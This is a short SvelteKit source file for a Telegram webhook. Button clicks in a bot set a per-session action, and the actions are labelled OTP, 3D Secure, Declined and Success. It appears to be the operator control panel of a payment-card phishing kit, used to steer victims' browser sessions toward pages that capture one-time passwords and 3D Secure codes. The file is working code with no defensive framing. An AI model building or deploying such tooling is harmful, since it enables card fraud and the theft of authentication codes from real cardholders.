import { setAction } from '$lib/sessions.js';
import { BOT_TOKEN } from '$lib/telegram.js';

/**
 * Telegram webhook: handles callback_query (inline button clicks).
 * Set the webhook with:
 *   curl -X POST https://api.telegram.org/bot<TOKEN>/setWebhook -d url=https://yourdomain/api/tg-hook
 *
 * @type {import('./$types').RequestHandler}
 */
export async function POST({ request, platform }) {
  let update;
  try {
    update = await request.json();
  } catch {
    return new Response('ok');
  }

  const cq = update.callback_query;
  if (!cq?.data) return new Response('ok');

  const [action, sessionId] = String(cq.data).split(':');
  if (!action || !sessionId) return new Response('ok');

  await setAction(platform, sessionId, action);

  const labels = {
    otp: '🔑 → OTP',
    '3ds': '🔗 → 3D Secure',
    decline: '❌ Declined',
    success: '✅ Success'
  };

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: cq.id, text: labels[action] || 'Done' })
    });
  } catch {}

  return new Response('ok');
}
